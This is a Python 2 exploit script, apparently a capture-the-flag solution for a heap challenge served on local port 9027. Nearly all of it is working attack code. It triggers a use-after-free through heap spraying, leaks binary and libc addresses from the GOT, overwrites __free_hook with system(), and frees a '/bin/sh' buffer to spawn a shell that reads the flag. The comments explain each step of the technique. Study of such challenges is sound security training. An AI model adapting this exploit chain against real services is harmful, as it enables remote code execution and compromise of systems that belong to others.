import os
import struct
import subprocess as sp
import sys
import string
import socket
import telnetlib

"""
OBJ format (0x118 = 280 bytes) on heap:
|| <rdata> char array (256) || <wdata> char ptr (8) -> <gbuf> addr || length of <gbuf> (8) -> 16 || <type> char ptr (8 bytes) -> "null/read/write" ||
"""

"""
global variable layout in third lokihardt mapping:
|| <gbuf> char array (16) || <theOBJ> ptr (8) || <randomPadding> void ptr (8) || int <refcount> (8) || 0x20(32) garbage bytes xxxxxx || <ArrayBuffer> OBJ ptr array (8*16 = 128) ||
"""

BINARY_BASE_OFFSET = 0x1258
CSTR_READ_OFFSET = -0xc35
CSTR_WRITE_OFFSET = -0xc3c
GBUF_OFFSET = 0x200de8
ARRAYBUF_OFFSET = 0x200e28
GOT_OFFSET = 0x201f40

FREAD_OFFSET = 0x6e0e0
SYS_OFFSET = 0x45380
FREEHOOK_OFFSET = 0x3c57a8 

def u64(addr_str):
    return struct.unpack("<Q", addr_str)[0]


def p64(addr_int):
    return struct.pack("<Q", addr_int)


def print_menu():
    # menus
    for i in range(0,6):
        p.readline()
        #print p.readline(),
    # "> "
    p.read(2)
    #print p.read(2)


def print_idx():
    # idx?
    p.read(5)
    #print p.read(5)


def alloc(idx, content, gbuf):
    #print "=== ALLOC ==="
    p.write("1\n")
    print_idx()
    p.write(str(idx) + "\n")
    p.write(content)
    p.write(gbuf)
    # ArrayBuffer[idx] = new Object()
    print p.readline(),
    print_menu()


def delete(idx):
    #print "=== DELETE ==="
    p.write("2\n")
    print_idx()
    p.write(str(idx) + "\n")
    # ArrayBuffer[idx] is deleted
    print p.readline(),
    print_menu()


def gc():
    #print "=== GC ==="
    p.write("4\n")
    print_menu()


def heapspray(loop_num, content, gbuf):
    #print "=== HEAPSPRAY ==="
    for i in range(0, loop_num):
        p.write("5\n")
        p.write(content)
        p.write(gbuf)
        print_menu()


def use(idx, use_type, offset):
    #print "=== USE ==="
    p.write("3\n")
    print_idx()
    p.write(str(idx) + "\n")
    if use_type == "read":
        target_str = p.read(offset)
        # it's either "type" not matching wdata->gbuf's "read" (i.e. "menu"), or the program crashes because wdata pointing to an invalid addr causing program crashes (i.e. "")
        if target_str == "- menu -" or target_str == "":
            raise
        else:
            # read the rest garbage bytes after the offset
            p.read(256-offset)
    elif use_type == "write":
        target_str = p.read(10)
        # if successfully triggered, it should be "your data?"
        if target_str == "your data?":
            p.write(p64(offset))
        else:
            raise
    print_menu()
    return target_str


if __name__ == '__main__':
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('0', 9027))
        p = s.makefile('rw', bufsize=0)

        try:
            print_menu()
            
            # alloc() first object w/ padding
            alloc(0, "\x41"*256, "a"*16)
            # delete() to decrement refCount by 1 so that the original object can be freed
            delete(9)
            # gc() to free the first object w/ padding
            gc()
            # heapspray() allocate 5 new objects to try to have "wdata->gbuf" matching "type" of the original object freed w/ padding
            heapspray(5, "\x41"*256, "read\x00"*3+"\x00")
            # use(), but try using wdata->gbuf->read of new heapsprayed objects to match the "type of the original object, throught the dangling ptr in arraybuf[0]
            type_ret_val = use(0, "read", 8)
            
            # calculate binary addry based on the addr pointing to "null"
            NULL_ADDR = u64(type_ret_val)
            BINARY_BASE_ADDR = NULL_ADDR - BINARY_BASE_OFFSET
            WRITE_ADDR = NULL_ADDR + CSTR_WRITE_OFFSET
            READ_ADDR = NULL_ADDR + CSTR_READ_OFFSET
            GBUF_ADDR = NULL_ADDR + GBUF_OFFSET
            ARRAYBUF_ADDR = NULL_ADDR + ARRAYBUF_OFFSET
            GOT_ADDR = BINARY_BASE_ADDR + GOT_OFFSET

            print "binary base addr: " + str(hex(BINARY_BASE_ADDR))
            print "\"null\" addr: " + str(hex(NULL_ADDR))
            print "\"read\" addr: " + str(hex(READ_ADDR))
            print "\"write\" addr: " + str(hex(WRITE_ADDR))
            print "GOT addr: " + str(hex(GOT_ADDR))
            #raw_input('debug')
        
            # alloc again w/ padding, this time after the 5 heapsprayed objects
            alloc(1, "\x41"*256, "a"*16)
            # delete to decrement refCount by 1 so that it can be freed by gc()
            delete(9)
            # gc() to free the object w/ padding
            gc()
            # heapspray() allocate 5 new objects; now we can try to fake [wdata, len, "write"] in rdata repeatedly, within the 256 bytes range
            # we target the wdata as the addr of ArrayBuffer[2] so that we can write to it the GOT_ADDR that we will use later, while only 8 bytes will be written to it
            heapspray(5, (p64(ARRAYBUF_ADDR+2*8)+p64(0x0000000000000008)+p64(WRITE_ADDR))*10+"\x42"*16, "\x42"*16)
            # use() but this time we want to trigger the write behavior as we try to match type with the "write" addr in rdata of sprayed objects on heap
            use(1, "write", GOT_ADDR)
            
            # alloc 3rd time w/ padding; this time we need to manipulate content of gbuf[16], as well as theOBJ's rdata becoming "read\x00" so that theOBJ now points to fake type of "read",
            # while gbuf becomes faked wdata & len
            alloc(3, "read\x00"*51+"\x00", "\x41"*16)
            # now use ArrayBuffer[2] instead because that's where the pointer points to GOT addr with GBUF & theOBJ set as wdata, len, type ptr respectively
            target_str = use(2, "read", 24)
            FREAD_ADDR = u64(target_str[16:24])
            print "fread addr: " + str(hex(FREAD_ADDR))
            LIBC_ADDR = FREAD_ADDR - FREAD_OFFSET
            SYSTEM_ADDR = LIBC_ADDR + SYS_OFFSET
            FREEHOOK_ADDR = LIBC_ADDR + FREEHOOK_OFFSET
            print "system addr: " + str(hex(SYSTEM_ADDR))
            print "__free_hook addr: " + str(hex(FREEHOOK_ADDR))
            delete(3)
            gc()

            # alloc 4th time w/ padding; this time we need to manipulate again gbuf[16], as well as theOBJ's rdata becoming "write\x00" so that theOBJ now points to fake type of "write",
            # while gbuf becomes faked wdata & len, which should be FREEHOOK_ADDR & length of 8
            alloc(3, "write\x00\x00\x00"*32, p64(FREEHOOK_ADDR) + p64(0x0000000000000008))
            # use ArrayBuffer[2] again to write the system addr to freehook as indicated in prev step of wdata with length 8
            target_str = use(2, "write", SYSTEM_ADDR)
            delete(3) 
            # gc() now execute system() instead with "write" as parameters, nothing will happen
            gc()

            # alloc 5th time w/ padding; but this time it only needs free() to execute system() as __free_hook has been changed!
            alloc(3, "/bin/sh\x00"*32, "\x41"*16)
            delete(3)
            # call gc() w/o print menu
            p.write("4\n")
            
            p.write("cat flag\n")
            while True:
                print p.readline()

        except KeyboardInterrupt:
            raise
        except:
            print "ERROR"
            p.close()
            continue
